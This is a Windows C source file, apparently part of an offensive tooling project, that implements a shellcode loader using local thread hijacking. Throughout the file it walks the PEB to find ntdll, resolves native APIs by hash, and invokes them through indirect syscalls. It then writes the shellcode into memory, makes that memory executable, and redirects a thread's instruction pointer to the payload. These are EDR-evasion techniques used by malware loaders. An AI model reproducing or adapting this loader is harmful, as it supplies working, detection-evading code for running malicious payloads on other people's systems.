#include "local_thread.h"
#include "box.h"

VOID Dumbo(VOID)
{
	MessageBoxA(NULL, "Local Thread Hijacking Successful!", "Hijack Me", MB_OK);
	return;
}

BOOL LocalThreadHijack
(
	IN HANDLE hProcess,
	OUT HANDLE* hThread,
	OUT PVOID* pAddress,
	IN PBYTE pShellcode,
	IN SIZE_T SizeofShellcode
)

{

	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProt = NULL;
	NTSTATUS STATUS = NULL;
	PVOID rBuffer = NULL;
	PUCHAR localBuf = NULL;
	SIZE_T origSize = SizeofShellcode;
	SIZE_T regionSize = SizeofShellcode;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThreadEx"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;

		localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SizeofShellcode);
		if (!localBuf) {
			WARN("HeapAlloc failed");
			return FALSE;
		}
		memcpy(localBuf, pShellcode, SizeofShellcode);
	}


		/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

		SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
		STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
			(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (STATUS != STATUS_SUCCESS)
		{
			WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
			HeapFree(GetProcessHeap(), 0, localBuf);
			return FALSE;
		}

		INFO("Allocated [%zu] Bytes to Virtual Memory!", SizeofShellcode);

		/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

		SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
		STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
			(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
		if (STATUS != STATUS_SUCCESS)
		{
			WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
			HeapFree(GetProcessHeap(), 0, localBuf);
			return FALSE;
		}


		OKAY("Wrote [%zu] Bytes to Virtual Memory", SizeofShellcode);

		/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/

		SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
		STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
			(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
		if (STATUS != STATUS_SUCCESS)
		{
			WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
			HeapFree(GetProcessHeap(), 0, localBuf);
			return FALSE;
		}

		INFO("Changed Allocation Protection from [RW] to [RX]");

		/*----------------------------------------------------------[Creating a Thread Inside our Dummy Function]-------------------------------------------*/

		SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtCreateThreadEx
		STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
			(hThread, THREAD_ALL_ACCESS, &OA, hProcess, (LPTHREAD_START_ROUTINE)Dumbo, NULL, FALSE, 0, 0, 0, NULL);
		if (STATUS_SUCCESS != STATUS)
		{
			WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
			return FALSE;
		}

		INFO("Successfully Created Thread Inside Dumbo!");

		*pAddress = rBuffer;

		HeapFree(GetProcessHeap(), 0, localBuf);
		return TRUE;
}


BOOL HijackThread
(
	IN HANDLE hThread,
	IN PVOID pAddress
)

{

	NTSTATUS		STATUS = NULL;
	ULONG suspendedCount = 0;

	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[4] = { 0 };

	if (!hThread || hThread == INVALID_HANDLE_VALUE || !pAddress) {
		WARN("Invalid parameters to HijackThread");
		return FALSE;
	}

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtGetContextThread",
		"NtSetContextThread",
		"NtResumeThread",
		"NtWaitForSingleObject"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}
	

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtGetContextThread
	STATUS = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
		(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtGetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	printf("[X] | Current RIP Address --> [0x%p]\n", (PVOID)ThreadCtx.Rip);

	OKAY("Successfully got Thread Context!");

	ThreadCtx.Rip = (DWORD64)pAddress;

	printf("[X] | Changed RIP Address --> [0x%p] To Point to Our Payload!\n", (PVOID*)ThreadCtx.Rip);

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtSetContextThread
	STATUS = ((NTSTATUS(*)(HANDLE, PCONTEXT))SyscallInvoker)
		(hThread, &ThreadCtx);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtSetContextThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}

	OKAY("Successfully set Thread Context!");

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtResumeThread
	STATUS = ((NTSTATUS(*)(HANDLE, PULONG))SyscallInvoker)
		(hThread, &suspendedCount);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtResumeThread Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Resuming Thread....");

	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtWaitForSingleObject
	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
		(hThread, FALSE, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWaitForSingleObject Failed! With an Error: 0x%0.8x", STATUS);
		return FALSE;
	}


	INFO("Waiting for Thread to Finish Executing...");


	return TRUE;
}